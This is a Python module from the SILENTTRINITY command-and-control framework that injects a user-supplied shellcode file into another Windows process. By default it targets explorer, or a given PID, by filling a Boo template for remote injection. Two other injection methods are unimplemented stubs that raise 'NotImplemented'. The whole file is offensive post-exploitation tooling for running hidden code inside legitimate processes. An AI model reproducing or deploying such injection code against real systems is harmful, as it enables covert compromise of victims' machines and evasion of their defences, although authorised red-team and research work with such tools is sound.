import os
from silenttrinity.core.utils import shellcode_to_int_byte_array, get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/shellcode'
        self.language = 'boo'
        self.description = 'Injects shellcode using the specified technique'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Shellcode': {
                'Description'   :   'Path to shellcode',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Process': {
                'Description'   :   'Process to inject into. [Not used if PID is set to value other than 0]',
                'Required'      :   False,
                'Value'         :   'explorer'
            },
            'PID': {
                'Description'   :   'PID to inject into. [Will use ProcessName if 0]',
                'Required'      :   False,
                'Value'         :   '0' 
            },
            'InjectionMethod': {
                'Description'   :   'Injection Method',
                'Required'      :   False,
                'Value'         :   'InjectRemote'
            }
        }

    def payload(self):
        shellcode_path = os.path.expanduser(self.options['Shellcode']['Value'])
        if os.path.exists(shellcode_path):
            with open(shellcode_path, 'rb') as shellcode:
                if self.options['InjectionMethod']['Value'] == 'InjectRemote':
                    with open(get_path_in_package('core/teamserver/modules/boo/src/injectremote.boo'), 'r') as module_src:
                        shellcode = shellcode_to_int_byte_array(shellcode.read())
                        src = module_src.read()
                        src = src.replace('BYTES', shellcode)
                        src = src.replace('PROCESS', self.options['Process']['Value'])
                        src = src.replace('PID', self.options['PID']['Value'])
                        return src

                elif self.options['InjectionMethod']['Value'] == 'QueueUserAPC':
                    raise NotImplemented

                elif self.options['InjectionMethod']['Value'] == 'InjectSelf':
                    raise NotImplemented
